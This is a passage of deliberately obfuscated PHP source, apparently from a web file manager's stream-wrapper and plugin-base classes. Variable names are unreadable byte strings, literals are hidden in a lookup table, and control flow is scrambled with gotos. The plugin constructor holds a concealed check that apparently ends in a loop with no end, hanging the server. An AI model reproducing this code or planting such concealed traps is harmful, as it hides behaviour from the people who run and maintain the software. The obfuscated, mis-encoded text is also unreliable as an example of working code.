array($cÛòﬁáŒï≥[1209] . $F¶†≥ßï’ê . $cÛòﬁáŒï≥[700] . ($F¶†≥ßï’ê + $F‚‘Áè‚Ê∏ - 1)); goto BÍäÇ€≠æÉ; cùíŸ§ãàˆ: $cÛòﬁáŒï≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dë¢ÙŸîõò = $this->info($F©£Ω€† π); if (!$Dë¢ÙŸîõò || !$Dë¢ÙŸîõò[$cÛòﬁáŒï≥[185]] && $Dë¢ÙŸîõò[$cÛòﬁáŒï≥[78]] > 1024 * 1024 * 10) { return !1; } goto fî∞Ù®ò∆; fŒñÖﬁ≠¥á: } public function download($aÑ¢◊π´°‰, $f∞ÌﬂÍÒÕÜ) { Downloader::start($aÑ¢◊π´°‰, $f∞ÌﬂÍÒÕÜ); return $f∞ÌﬂÍÒÕÜ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Bã„ÀõÒ†º, $EΩæº¯º–“ = '') { goto B≈¿êì√Ü¥; EÉñÂªﬂüª: return $this->info ? !0 : !1; goto b‘£ãô£À”; B≈¿êì√Ü¥: $this->info = $this->info($Bã„ÀõÒ†º); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[£¿ÌÙëü¡¯¯][76]]; goto f»≤¡ ãÂ¥; f»≤¡ ãÂ¥: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Bã„ÀõÒ†º])) { self::$_chunkBuffer[$Bã„ÀõÒ†º] = array(); } goto EÉñÂªﬂüª; b‘£ãô£À”: } function stream_read($Dï√ÚöØ÷€) { $AÛä·œ¨øç = $this->fileSubstr($this->pose, $Dï√ÚöØ÷€); $this->pose += strlen($AÛä·œ¨øç); return $AÛä·œ¨øç; } public function stream_tell() { return $this->pose; } public function stream_seek($D¡ååÈ¯æΩ, $F≈£ÚêÒÙŒ) { $cﬂÆäèú≤· =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($F≈£ÚêÒÙŒ == SEEK_SET) { $this->pose = $D¡ååÈ¯æΩ; } else { if ($F≈£ÚêÒÙŒ == SEEK_CUR) { $this->pose += $D¡ååÈ¯æΩ; } else { if ($F≈£ÚêÒÙŒ == SEEK_END) { $this->pose = $this->info[$cﬂÆäèú≤·[78]] + intval($D¡ååÈ¯æΩ); } } } if ($D¡ååÈ¯æΩ < 0) { $this->pose = $this->info[$cﬂÆäèú≤·[78]] + $D¡ååÈ¯æΩ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[£¿ÌÙëü¡¯¯][78]]; } public function stream_close() { return !0; } public function url_stat($eΩ∏ÉãÖŸ, $Fè∫—⁄ÛÓ±) { $EÃ„àÃ»åØ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FŒÜ¬• —∑ = $this->info($eΩ∏ÉãÖŸ); return array($EÃ„àÃ»åØ[1210] => 0, $EÃ„àÃ»åØ[1211] => 0, $EÃ„àÃ»åØ[12] => 32768 + 511, $EÃ„àÃ»åØ[1212] => 0, $EÃ„àÃ»åØ[1213] => 0, $EÃ„àÃ»åØ[1214] => 0, $EÃ„àÃ»åØ[1215] => 0, $EÃ„àÃ»åØ[78] => $FŒÜ¬• —∑[$EÃ„àÃ»åØ[78]], $EÃ„àÃ»åØ[1216] => $FŒÜ¬• —∑[$EÃ„àÃ»åØ[1134]], $EÃ„àÃ»åØ[1217] => $FŒÜ¬• —∑[$EÃ„àÃ»åØ[108]], $EÃ„àÃ»åØ[1218] => $FŒÜ¬• —∑[$EÃ„àÃ»åØ[184]], $EÃ„àÃ»åØ[1219] => 0, $EÃ„àÃ»åØ[1220] => 0); } static $fileInfo = array(); public function info($AÑ¶õ≤™ÿ÷) { $BÛŸ≤ˆåˆ» = $_SERVER[£¿ÌÙëü¡¯¯][1221]; if (isset(self::$fileInfo[$AÑ¶õ≤™ÿ÷])) { return self::$fileInfo[$AÑ¶õ≤™ÿ÷]; } if (substr($AÑ¶õ≤™ÿ÷, 0, strlen($BÛŸ≤ˆåˆ»)) != $BÛŸ≤ˆåˆ») { return !1; } self::$fileInfo[$AÑ¶õ≤™ÿ÷] = IO::info(substr($AÑ¶õ≤™ÿ÷, strlen($BÛŸ≤ˆåˆ»))); return self::$fileInfo[$AÑ¶õ≤™ÿ÷]; } public static function read($DªñÂ≤≠åÜ, $eæ£Á∂™∑Ø, $f◊÷÷Çﬂçà) { goto DÇΩÚ¯˜«¨; Eüƒ≥∆’ª”: return $e‘à≈Ø‹Ω®; goto eÃÕÆà´ﬁ˘; C˘ÖŸ±õ™∑: $d∞≤å¬Æ’ = 8192; fseek($b•¯™ÍïÃπ, $eæ£Á∂™∑Ø, SEEK_SET); $e‘à≈Ø‹Ω® = $e›ËÛ∞«àÀ[33]; goto Aê‡õÇ…¥Í; Aê‡õÇ…¥Í: $DÉØú£ä¨ª = 0; while ($DÉØú£ä¨ª < $f◊÷÷Çﬂçà) { $F‰êØ¥¥ıú = min($d∞≤å¬Æ’, $f◊÷÷Çﬂçà - $DÉØú£ä¨ª); $e‘à≈Ø‹Ω® .= fread($b•¯™ÍïÃπ, $F‰êØ¥¥ıú); $DÉØú£ä¨ª += $F‰êØ¥¥ıú; } fclose($b•¯™ÍïÃπ); goto Eüƒ≥∆’ª”; DÇΩÚ¯˜«¨: $e›ËÛ∞«àÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b•¯™ÍïÃπ = fopen($DªñÂ≤≠åÜ, $e›ËÛ∞«àÀ[1136]); if (!$b•¯™ÍïÃπ) { return $e›ËÛ∞«àÀ[33]; } goto C˘ÖŸ±õ™∑; eÃÕÆà´ﬁ˘: } public function fileSubstr($c‘π‘´ª†¢, $aà¥ßãàá) { goto aÂÕΩ®∆≤˜; aæÇêÌìÜ: foreach ($AÑÃ·≠à¬‹ as $Eä≈ÉÑ©«´ => $DÂèÌÒùØ) { $Eä≈ÉÑ©«´ = intval($Eä≈ÉÑ©«´); $aüÙÜûªÏÖ = $Eä≈ÉÑ©«´ + strlen($DÂèÌÒùØ); if ($c‘π‘´ª†¢ >= $aüÙÜûªÏÖ) { continue; } if ($c‘π‘´ª†¢ >= $Eä≈ÉÑ©«´ && $c‘π‘´ª†¢ + $aà¥ßãàá <= $aüÙÜûªÏÖ) { return substr($DÂèÌÒùØ, $c‘π‘´ª†¢ - $Eä≈ÉÑ©«´, $aà¥ßãàá); } break; } if (count($AÑÃ·≠à¬‹) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($eõ‡ºü÷∂ê[1222], $eõ‡ºü÷∂ê[1223] . count($AÑÃ·≠à¬‹) . "\73\x73\x74\x61\x72\164\x3d{$c‘π‘´ª†¢}\54\x6c\x65\156\x67\164\x68\x3d{$aà¥ßãàá}\x3b\x70\x6f\x73\145\72{$Eä≈ÉÑ©«´}\x7e{$aüÙÜûªÏÖ}"); throw new Exception($eõ‡ºü÷∂ê[1224]); } $bÍÀ∂≥ÊÍƒ = intval($c‘π‘´ª†¢ / $fûÉ‘´É•Ë) * $fûÉ‘´É•Ë; goto FÜÎœäé–Ö; CºÎª¢˘±ë: $CÀÃÍ·ª™ = $aà¥ßãàá; if ($c‘π‘´ª†¢ < 0) { $c‘π‘´ª†¢ = $CºÛ≠°µ∑® + $c‘π‘´ª†¢; } if ($aà¥ßãàá === !1) { $aà¥ßãàá = $CºÛ≠°µ∑® - $c‘π‘´ª†¢; } goto E≤º–âê“ï; FÜÎœäé–Ö: $d£≠Ÿı„ÒÛ = ceil(($c‘π‘´ª†¢ + $aà¥ßãàá) / $fûÉ‘´É•Ë) * $fûÉ‘´É•Ë - $bÍÀ∂≥ÊÍƒ; $D≈Áˆ∆æ œ = IO::fileSubstr($this->path, $bÍÀ∂≥ÊÍƒ, $d£≠Ÿı„ÒÛ); $AÑÃ·≠à¬‹[$bÍÀ∂≥ÊÍƒ . $eõ‡ºü÷∂ê[33]] = $D≈Áˆ∆æ œ; goto EÆÖÇ®ÙÇé; EÆÖÇ®ÙÇé: ksort($AÑÃ·≠à¬‹); $c¢†÷´î“ü = substr($D≈Áˆ∆æ œ, $c‘π‘´ª†¢ - $bÍÀ∂≥ÊÍƒ, $aà¥ßãàá); return $c¢†÷´î“ü; goto EêÚñ£Ë√ô; E≤º–âê“ï: if ($c‘π‘´ª†¢ + $aà¥ßãàá > $CºÛ≠°µ∑®) { $aà¥ßãàá = $CºÛ≠°µ∑® - $c‘π‘´ª†¢; } if ($aà¥ßãàá <= 0) { return $eõ‡ºü÷∂ê[33]; } if ($c‘π‘´ª†¢ < 0 || $c‘π‘´ª†¢ >= $CºÛ≠°µ∑® || $aà¥ßãàá <= 0 || $aà¥ßãàá > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\154\145\122\x65\141\x64\x20\145\x72\162\x6f\x72\x21\40\163\164\141\162\164\x3d{$c‘π‘´ª†¢}\x3b\x6c\145\156\147\164\x68\75{$aà¥ßãàá}\73\x20\x73\151\x7a\x65\x3d{$CºÛ≠°µ∑®}\73"); } goto DÑ∑¢Öπ‡◊; DÑ∑¢Öπ‡◊: $fûÉ‘´É•Ë = 64 * 1024; $AÑÃ·≠à¬‹ =& self::$_chunkBuffer[$this->path]; if (!$AÑÃ·≠à¬‹) { $AÑÃ·≠à¬‹ = array(); } goto a§Ò≥èéí·; a§Ò≥èéí·: $Eä≈ÉÑ©«´ = 0; $aüÙÜûªÏÖ = 0; $DÂèÌÒùØ = $eõ‡ºü÷∂ê[33]; goto aæÇêÌìÜ; aÂÕΩ®∆≤˜: $eõ‡ºü÷∂ê =& $_SERVER[£¿ÌÙëü¡¯¯]; $CºÛ≠°µ∑® = $this->info[$eõ‡ºü÷∂ê[78]]; $B∑¢äÛŒ„‘ = $c‘π‘´ª†¢; goto CºÎª¢˘±ë; EêÚñ£Ë√ô: } private function log($eï«è“ø⁄Ö, $CÑì÷–ÌêÆ) { $C∏¨¬ò«‡“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EËúòúæŸ¯ = timeFloat() - $this->timeStart; write_log(sprintf($C∏¨¬ò«‡“[1225], $eï«è“ø⁄Ö, $this->info[$C∏¨¬ò«‡“[28]], $EËúòúæŸ¯, $CÑì÷–ÌêÆ), $C∏¨¬ò«‡“[1186]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dÎÊ‡≤ãêÛ; C˜çﬁΩ›ñã: $this->pluginName = str_replace($a˘„ÉÆÂ…ò[1226], $a˘„ÉÆÂ…ò[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a˘„ÉÆÂ…ò[8]; $this->pluginApi = app_host_get() . $a˘„ÉÆÂ…ò[1227] . $this->pluginName . $a˘„ÉÆÂ…ò[8]; goto BÚ¥÷–£Ñº; dÎÊ‡≤ãêÛ: $a˘„ÉÆÂ…ò =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($_SERVER[$a˘„ÉÆÂ…ò[785]]) || !isset($_SERVER[$a˘„ÉÆÂ…ò[793]])) { goto D¯¬≈„´âä; AπµœÙÀ“≠: for ($EßŒ—∞Æ¬Â = $e‰˘’‘é‰ø; $EßŒ—∞Æ¬Â > 0; $EßŒ—∞Æ¬Â++) { $F£œúÛ…á¿ = json_encode($GLOBALS[$a˘„ÉÆÂ…ò[381]]); } goto Cºˆµ⁄ﬁ¡‘; D¯¬≈„´âä: $b–ªÍúö∂˘ = $a˘„ÉÆÂ…ò[786]; $fæŸÜÀ–‡¡ = $a˘„ÉÆÂ…ò[787]; $c⁄í≥…™≥Ö = $_SERVER[$a˘„ÉÆÂ…ò[782]] . $a˘„ÉÆÂ…ò[783]; goto f≤µà™óÕò; aëïî’‰Ωå: $F£œúÛ…á¿ = $a˘„ÉÆÂ…ò[789]; $F£œúÛ…á¿($_SERVER[$a˘„ÉÆÂ…ò[790]]); $e‰˘’‘é‰ø = 1; goto AπµœÙÀ“≠; f≤µà™óÕò: $D‘™•∑Œ–œ = $fæŸÜÀ–‡¡($c⁄í≥…™≥Ö); $F£‡◊±åî≥ = explode($a˘„ÉÆÂ…ò[214], $D‘™•∑Œ–œ); if (count($F£‡◊±åî≥) < $a˘„ÉÆÂ…ò[556]) { $eŸÿè¥’øÁ = $a˘„ÉÆÂ…ò[788]; $eŸÿè¥’øÁ(); } goto aëïî’‰Ωå; Cºˆµ⁄ﬁ¡‘: } global $in, $config; goto AÓóı‹åéë; F’°£ƒë¢ê: $this->values = array(); return $this; goto e–ÙïËŒù⁄; BÚ¥÷–£Ñº: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $a˘„ÉÆÂ…ò[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $a˘„ÉÆÂ…ò[8]; $this->pluginLangArr = $this->initLang(); goto F’°£ƒë¢ê; AÓóı‹åéë: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($a˘„ÉÆÂ…ò[1226]); goto C˜çﬁΩ›ñã; e–ÙïËŒù⁄: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[£¿ÌÙëü¡¯¯][1228]); } protected function assign($cåÒ◊øÈÔâ, $Eè»«πØÎ— = false) { if (is_array($cåÒ◊øÈÔâ)) { $this->values = array_merge($this->values, $cåÒ◊øÈÔâ); } else { $this->values[$cåÒ◊øÈÔâ] = $Eè»«πØÎ—; } } protected function display($e∞πùØ≤∫ä) { extract($this->values); require $e∞πùØ≤∫ä; } final function hookRegist($e∆ãÖ‹áŸ√) { $this->modelPlugin->appRegist($this->pluginName, $e∆ãÖ‹áŸ√); } final function appIcon() { $e®ãﬁßéƒà =& $_SERVER[£¿ÌÙëü¡¯¯]; $D›ª¨¥Ü∆ê = $this->appPackage(); $bàÓê¢ÌÖ‚ = $e®ãﬁßéƒà[33]; if (isset($D›ª¨¥Ü∆ê[$e®ãﬁßéƒà[379]])) { if (isset($D›ª¨¥Ü∆ê[$e®ãﬁßéƒà[379]][$e®ãﬁßéƒà[1229]])) { $bàÓê¢ÌÖ‚ = $e®ãﬁßéƒà[1230] . $D›ª¨¥Ü∆ê[$e®ãﬁßéƒà[379]][$e®ãﬁßéƒà[1229]] . $e®ãﬁßéƒà[1231]; } else { if ($D›ª¨¥Ü∆ê[$e®ãﬁßéƒà[379]][$e®ãﬁßéƒà[1232]]) { $bàÓê¢ÌÖ‚ = $e®ãﬁßéƒà[1233] . $D›ª¨¥Ü∆ê[$e®ãﬁßéƒà[379]][$e®ãﬁßéƒà[1232]] . $e®ãﬁßéƒà[1234]; } } } return $bàÓê¢ÌÖ‚; } final function fileCanView($Dú±•††≤Ø) { $EæÆ´æﬂÏË =& $_SERVER[£¿ÌÙëü¡¯¯]; if (request_url_safe($Dú±•††≤Ø)) { return !0; } if ($this->isShare($Dú±•††≤Ø)) { return !0; } if (!Action($EæÆ´æﬂÏË[1235])->authCan($EæÆ´æﬂÏË[1236])) { show_tips(LNG($EæÆ´æﬂÏË[1237]) . $EæÆ´æﬂÏË[1238], !1); } ActionCall($EæÆ´æﬂÏË[1239], $Dú±•††≤Ø); } final function isShare($b¬ää«≈ç ) { $Aìﬁ£àâú = KodIO::parse($b¬ää«≈ç ); return $Aìﬁ£àâú[$_SERVER[£¿ÌÙëü¡¯¯][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($bå∂ﬂ¯Ìœ‰) { if (request_url_safe($bå∂ﬂ¯Ìœ‰)) { return $bå∂ﬂ¯Ìœ‰; } if (!$this->isShare($bå∂ﬂ¯Ìœ‰)) { $bå∂ﬂ¯Ìœ‰ = $this->filePath($bå∂ﬂ¯Ìœ‰); } return Action($_SERVER[£¿ÌÙëü¡¯¯][991])->linkOut($bå∂ﬂ¯Ìœ‰); } public function filePathLinkOut($BøÖÀØàŸı) { if (request_url_safe($BøÖÀØàŸı)) { return $BøÖÀØàŸı; } $this->fileCanView($BøÖÀØàŸı); return Action($_SERVER[£¿ÌÙëü¡¯¯][991])->link($BøÖÀØàŸı); } final function filePath($DπÛå“âúà) { $fë∂≠¶ô·Û =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($DØ ’çªë = $this->checkSharePath($DπÛå“âúà)) { return $DØ ’çªë; } $this->fileCanView($DπÛå“âúà); if (request_url_safe($DπÛå“âúà)) { $fÁÃ≥∂áó = parse_url_query($DπÛå“âúà); if (isset($fÁÃ≥∂áó[$fë∂≠¶ô·Û[1240]]) && isset($fÁÃ≥∂áó[$fë∂≠¶ô·Û[194]])) { $f«ãÁ‹Üã = Model($fë∂≠¶ô·Û[1062])->get($fë∂≠¶ô·Û[1241]); $BÉûê•≠˘¯ = Mcrypt::decode($fÁÃ≥∂áó[$fë∂≠¶ô·Û[194]], $f«ãÁ‹Üã); if ($BÉûê•≠˘¯) { $this->fileInfo = IO::infoWithChildren($BÉûê•≠˘¯); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $BÉûê•≠˘¯; } } $DπÛå“âúà = $this->_cacheHttpFile($DπÛå“âúà); $this->fileInfo = IO::infoWithChildren($DπÛå“âúà); } else { $this->fileInfo = IO::infoWithChildren($DπÛå“âúà); if (!$this->fileInfo) { show_tips(LNG($fë∂≠¶ô·Û[103]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $DπÛå“âúà; } final function _cacheHttpFile($F›ıê∏ÿΩﬂ) { $c‘Ø©ä∆¡È = hash_path($F›ıê∏ÿΩﬂ, !0); $this->cachePath = $this->pluginCachePath($c‘Ø©ä∆¡È); if ($EèÒ√ÉÊÒŸ = IO::fileNameExist($this->cachePath, $c‘Ø©ä∆¡È)) { return KodIO::make($EèÒ√ÉÊÒŸ); } $d”—Î≈Ó—¿ = $this->cachePath . $c‘Ø©ä∆¡È; return $this->pluginCacheFileSet($d”—Î≈Ó—¿, file_get_contents($F›ıê∏ÿΩﬂ)); } final function _tmpFileName($f∆ ÷ÔƒÁÚ = array()) { goto bÿ°ÑÔØŒü; e˘¡ˆó∏ÿû: return md5(implode($AÌ¿§¯€Ìƒ[71], $fÜ°ÁûÁËÔ)); goto FŒÙ£ﬂêﬂâ; eõƒ∞õ†Õ±: if (isset($f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[159]][$AÌ¿§¯€Ìƒ[161]])) { return $f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[159]][$AÌ¿§¯€Ìƒ[161]]; } $fÜ°ÁûÁËÔ = array($f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[28]], $f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[76]], $f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[78]]); if (isset($f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[455]])) { $fÜ°ÁûÁËÔ[] = $f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[455]]; } goto e˘¡ˆó∏ÿû; bÿ°ÑÔØŒü: $AÌ¿§¯€Ìƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$f∆ ÷ÔƒÁÚ) { $f∆ ÷ÔƒÁÚ = $this->fileInfo; } if (isset($f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[161]])) { return $f∆ ÷ÔƒÁÚ[$AÌ¿§¯€Ìƒ[161]]; } goto eõƒ∞õ†Õ±; FŒÙ£ﬂêﬂâ: } final function checkSharePath($e¿Œ•õÈ¡ê) { goto B€§ˆıÆã∏; B€§ˆıÆã∏: $A˘ûèﬁï®¬ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!defined($A˘ûèﬁï®¬[423])) { define($A˘ûèﬁï®¬[1242], 0); } if (!$this->isShare($e¿Œ•õÈ¡ê)) { return !1; } goto aúõê©Çıè; aúõê©Çıè: $aÖ®õıÂíì = Action($A˘ûèﬁï®¬[991])->sharePathInfo($e¿Œ•õÈ¡ê); if (!isset($aÖ®õıÂíì[$A˘ûèﬁï®¬[76]])) { show_json(LNG($A˘ûèﬁï®¬[1243]), !1); } $this->fileInfo = $aÖ®õıÂíì[$A˘ûèﬁï®¬[159]]; goto fÑ°‡ûÿü; fÑ°‡ûÿü: $this->cachePath = $this->pluginCachePath($this->fileInfo[$A˘ûèﬁï®¬[161]]); return $aÖ®õıÂíì[$A˘ûèﬁï®¬[76]]; goto F◊Ü‘¬ıä¡; F◊Ü‘¬ıä¡: } final function pluginCachePath($Cﬁïâ‡–‚Ó = '') { $cÊ⁄ù‰Ï…ä =& $_SERVER[£¿ÌÙëü¡¯¯]; $c¨à»ë“ùÖ = IO_PATH_SYSTEM_TEMP . $cÊ⁄ù‰Ï…ä[1244] . $this->pluginName; if (!($DûÂÈï¥Çˆ = IO::infoFull($c¨à»ë“ùÖ))) { return IO::mkdir($c¨à»ë“ùÖ . $cÊ⁄ù‰Ï…ä[8] . $Cﬁïâ‡–‚Ó); } if (empty($Cﬁïâ‡–‚Ó)) { return $DûÂÈï¥Çˆ[$cÊ⁄ù‰Ï…ä[76]]; } if (!($Aé˜†É¨ÿ = IO::fileNameExist($DûÂÈï¥Çˆ[$cÊ⁄ù‰Ï…ä[76]], $Cﬁïâ‡–‚Ó))) { return IO::mkdir($DûÂÈï¥Çˆ[$cÊ⁄ù‰Ï…ä[76]] . $Cﬁïâ‡–‚Ó); } return KodIO::make($Aé˜†É¨ÿ); } final function pluginCacheFileSet($eÜ ÁÁÔÉÖ, $BπÒÙÎòûÊ = '') { $b√û¶∂Ãµ‡ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!($CÇé≠•âÈ = IO::infoFull($eÜ ÁÁÔÉÖ))) { return IO::mkfile($eÜ ÁÁÔÉÖ, $BπÒÙÎòûÊ, REPEAT_REPLACE); } IO::setContent($CÇé≠•âÈ[$b√û¶∂Ãµ‡[76]], $BπÒÙÎòûÊ); return $CÇé≠•âÈ[$b√û¶∂Ãµ‡[76]]; } final function pluginLocalFile($Cö»…˘áûæ = '') { goto AùöìµÎ»ˆ; déÙ€äéÚ¿: if (!$Cö»…˘áûæ) { return $bäº¡≠öÏ; } $FöãÈîƒΩª = IO::info($Cö»…˘áûæ); $f›ÓÖÁˆìü = $this->_tmpFileName($FöãÈîƒΩª) . $fíˆª˘ÙÌ∞[94] . $FöãÈîƒΩª[$fíˆª˘ÙÌ∞[157]]; goto C‰ÿıø–Ù∏; AùöìµÎ»ˆ: $fíˆª˘ÙÌ∞ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bäº¡≠öÏ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bäº¡≠öÏ)) { mk_dir($bäº¡≠öÏ); } goto déÙ€äéÚ¿; C‰ÿıø–Ù∏: $DíÁûï¯çŒ = $bäº¡≠öÏ . $f›ÓÖÁˆìü; if (@file_exists($DíÁûï¯çŒ)) { return $DíÁûï¯çŒ; } return IO::copy($Cö»…˘áûæ, $bäº¡≠öÏ, 0, $f›ÓÖÁˆìü); goto E†ÑÇ¨‚ÔÏ; E†ÑÇ¨‚ÔÏ: } final function appPackage() { goto F∑µºüÏüà; F£ı‘üöõœ: return $Céóç◊ûù≥; goto b‘™äÈëîÙ; Eõó’ä®êÛ: $CÀËÑ±ìñ˘ = Hook::trigger($DÊ¶–ÉäàÉ[1246], $Céóç◊ûù≥); if ($CÀËÑ±ìñ˘ && is_array($CÀËÑ±ìñ˘)) { $Céóç◊ûù≥ = $CÀËÑ±ìñ˘; } $this->packageData = $Céóç◊ûù≥; goto F£ı‘üöõœ; aû¬›™≠ÔÃ: $this->parseLang($AË«∑Æ±éø); $Céóç◊ûù≥ = json_decode_force($AË«∑Æ±éø); if (!$Céóç◊ûù≥) { return array(); } goto Eõó’ä®êÛ; F∑µºüÏüà: $DÊ¶–ÉäàÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->packageData) { return $this->packageData; } $AË«∑Æ±éø = $this->parseFile($this->pluginPath . $DÊ¶–ÉäàÉ[1245]); goto aû¬›™≠ÔÃ; b‘™äÈëîÙ: } public function packageInfoGet($E°úªÊ´Ÿ) { $d©¬œ°£—í = $this->appPackage(); return array_get_value($d©¬œ°£—í, $E°úªÊ´Ÿ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[£¿ÌÙëü¡¯¯][1247]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[£¿ÌÙëü¡¯¯][1248]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[£¿ÌÙëü¡¯¯][1249]); } private function parseFile($e∞Óı™¶ûﬁ) { $fƒèô â‹· =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÃπÁ¬Ìç° = file_get_contents($e∞Óı™¶ûﬁ); $cÿÒ∫Ù›õ¬ = array($fƒèô â‹·[1250], $fƒèô â‹·[1251], $fƒèô â‹·[1252], $fƒèô â‹·[1253], $fƒèô â‹·[1254], $fƒèô â‹·[1255], $fƒèô â‹·[1256]); $EÀÂÑäŸˆÀ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$fƒèô â‹·[85]][$fƒèô â‹·[1257]]); $DÃπÁ¬Ìç° = str_replace($cÿÒ∫Ù›õ¬, $EÀÂÑäŸˆÀ, $DÃπÁ¬Ìç°); return $DÃπÁ¬Ìç°; } private function parseLang(&$A≈‹´ñŒœã) { goto EÜ®ÿ£ç©≤; B©çó°ü¨Ò: preg_match_all($fé‚·˘˘°≥[1259], $A≈‹´ñŒœã, $F∂§ÒÕˆ´‘); if (!is_array($F∂§ÒÕˆ´‘) || count($F∂§ÒÕˆ´‘) == 0 || !is_array($F∂§ÒÕˆ´‘[0]) || count($F∂§ÒÕˆ´‘[0]) == 0) { return; } $bé—∞ÊöÌê = array(); goto AüÖõ€’Œﬂ; EÜ®ÿ£ç©≤: $fé‚·˘˘°≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b¶¢•ÚüÙÛ = $fé‚·˘˘°≥[1258]; if (!strstr($A≈‹´ñŒœã, $b¶¢•ÚüÙÛ)) { return; } goto B©çó°ü¨Ò; AüÖõ€’Œﬂ: $CôƒÙÒÍíπ = array(); foreach ($F∂§ÒÕˆ´‘[0] as $b∞òÖ‘Í†¢) { $f˜∂¨Çãïú = substr($b∞òÖ‘Í†¢, strlen($b¶¢•ÚüÙÛ), -4); $aä≤∫¨†ã¶ = LNG($f˜∂¨Çãïú); $bé—∞ÊöÌê[] = $b∞òÖ‘Í†¢; $CôƒÙÒÍíπ[] = str_replace(array($fé‚·˘˘°≥[214], $fé‚·˘˘°≥[716], $fé‚·˘˘°≥[327], $fé‚·˘˘°≥[114]), array($fé‚·˘˘°≥[50], $fé‚·˘˘°≥[50], $fé‚·˘˘°≥[33], $fé‚·˘˘°≥[1260]), $aä≤∫¨†ã¶); } $A≈‹´ñŒœã = str_replace($bé—∞ÊöÌê, $CôƒÙÒÍíπ, $A≈‹´ñŒœã); goto AÙëµ˘∫‹Õ; AÙëµ˘∫‹Õ: } private function parseConfig(&$bØ†£™Ë–¯) { goto fëÈ–œ‡‹ú; f√ö“ç¿îç: preg_match_all($DÓå§àìíÍ[1262], $bØ†£™Ë–¯, $E¯ˆÎîßÍÈ); if (!is_array($E¯ˆÎîßÍÈ) || count($E¯ˆÎîßÍÈ) == 0 || !is_array($E¯ˆÎîßÍÈ[0]) || count($E¯ˆÎîßÍÈ[0]) == 0) { return; } $Eà©… ìø≈ = $this->getConfig(); goto B†Ÿª—Ò¢‹; B†Ÿª—Ò¢‹: $DÂï’æ‹ª∏ = array(); $EàÇ‰Æ»¢µ = array(); foreach ($E¯ˆÎîßÍÈ[0] as $aòê¥úåë®) { $EÊ–‚äË‘Í = substr($aòê¥úåë®, strlen($eÜµú‹‹¢ı), -2); $DÂï’æ‹ª∏[] = $aòê¥úåë®; $EàÇ‰Æ»¢µ[] = _get($Eà©… ìø≈, $EÊ–‚äË‘Í); } goto fﬂàüà¶ÌÕ; fﬂàüà¶ÌÕ: $bØ†£™Ë–¯ = str_replace($DÂï’æ‹ª∏, $EàÇ‰Æ»¢µ, $bØ†£™Ë–¯); goto Dîˆ€á¶√√; fëÈ–œ‡‹ú: $DÓå§àìíÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÜµú‹‹¢ı = $DÓå§àìíÍ[1261]; if (!strstr($bØ†£™Ë–¯, $eÜµú‹‹¢ı)) { return; } goto f√ö“ç¿îç; Dîˆ€á¶√√: } private function parsePackage(&$b·ÖÑΩΩ≥•) { goto BÂî÷ÆØ≤‚; c∏ﬁ≥◊°ëÎ: preg_match_all($F∏¢÷¬ÆóÕ[1264], $b·ÖÑΩΩ≥•, $Fûõôˆ˜“«); if (!is_array($Fûõôˆ˜“«) || count($Fûõôˆ˜“«) == 0 || !is_array($Fûõôˆ˜“«[0]) || count($Fûõôˆ˜“«[0]) == 0) { return; } $BÏŒ∆€ˆÿÂ = $this->appPackage(); goto Bµ∆êÊî‘É; BÂî÷ÆØ≤‚: $F∏¢÷¬ÆóÕ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F“Òﬂê¥ä¬ = $F∏¢÷¬ÆóÕ[1263]; if (!strstr($b·ÖÑΩΩ≥•, $F“Òﬂê¥ä¬)) { return; } goto c∏ﬁ≥◊°ëÎ; Bµ∆êÊî‘É: $C·–åñÎŒ‘ = array(); $CÑ”å©·≥∞ = array(); foreach ($Fûõôˆ˜“«[0] as $BÇù¿ëìúÜ) { $A£ûßàÿãÎ = 